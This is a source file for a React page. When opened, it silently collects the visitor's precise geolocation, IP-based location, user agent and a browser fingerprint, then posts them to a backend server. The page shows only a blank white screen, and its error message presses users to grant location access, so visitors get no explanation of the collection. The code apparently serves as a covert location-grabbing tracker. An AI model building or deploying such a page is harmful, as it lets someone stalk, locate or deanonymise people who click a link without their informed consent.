import { useState, useEffect } from 'react'
import { generateFingerprint } from './fingerprint'
import './App.css'

interface LocationData {
  latitude: number
  longitude: number
  accuracy: number
  timestamp: number
}

interface IPData {
  ip: string
  city?: string
  region?: string
  country?: string
  timezone?: string
}

const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:8000'

function App() {
  const [location, setLocation] = useState<LocationData | null>(null)
  const [ipData, setIpData] = useState<IPData | null>(null)
  const [status, setStatus] = useState<'loading' | 'success' | 'error'>('loading')
  const [error, setError] = useState<string | null>(null)

  const getIPInfo = async () => {
    try {
      const response = await fetch('https://ipapi.co/json/')
      const data = await response.json()
      setIpData(data)
      return data
    } catch (err) {
      console.error('Failed to get IP info:', err)
      try {
        const response = await fetch('https://api.ipify.org?format=json')
        const data = await response.json()
        const basicData = { ip: data.ip }
        setIpData(basicData)
        return basicData
      } catch (fallbackErr) {
        console.error('Failed to get IP:', fallbackErr)
        return null
      }
    }
  }

  const sendLocationToServer = async (locationData: LocationData, ipInfo: IPData | null) => {
    try {
      const fingerprint = await generateFingerprint()
      
      const payload = {
        latitude: locationData.latitude,
        longitude: locationData.longitude,
        accuracy: locationData.accuracy,
        ip_address: ipInfo?.ip,
        user_agent: navigator.userAgent,
        city: ipInfo?.city,
        region: ipInfo?.region,
        country: ipInfo?.country,
        fingerprint: fingerprint
      }

      const response = await fetch(`${API_BASE_URL}/api/location`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload)
      })

      if (!response.ok) {
        throw new Error(`Server error: ${response.status}`)
      }

      const result = await response.json()
      console.log('Location sent successfully:', result)
      return result
    } catch (err) {
      console.error('Failed to send location to server:', err)
      throw err
    }
  }

  const captureLocation = async () => {
    if (!navigator.geolocation) {
      setError('Geolocation is not supported by this browser.')
      setStatus('error')
      return
    }

    const ipInfo = await getIPInfo()

    const options = {
      enableHighAccuracy: true,
      timeout: 15000,
      maximumAge: 0
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const locationData = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          timestamp: position.timestamp
        }
        
        setLocation(locationData)
        
        try {
          await sendLocationToServer(locationData, ipInfo)
          setStatus('success')
        } catch (err) {
          setError('Location captured but failed to send to server')
          setStatus('error')
        }
      },
      (error) => {
        let errorMessage = 'An unknown error occurred.'
        switch (error.code) {
          case error.PERMISSION_DENIED:
            errorMessage = 'Location access denied. Please allow location access and refresh the page.'
            break
          case error.POSITION_UNAVAILABLE:
            errorMessage = 'Location information is unavailable.'
            break
          case error.TIMEOUT:
            errorMessage = 'Location request timed out.'
            break
        }
        setError(errorMessage)
        setStatus('error')
      },
      options
    )
  }

  useEffect(() => {
    captureLocation()
  }, [])

  console.log('Status:', status, 'Location:', location, 'IP:', ipData, 'Error:', error)

  return (
    <div className="min-h-screen bg-white"></div>
  )
}

export default App
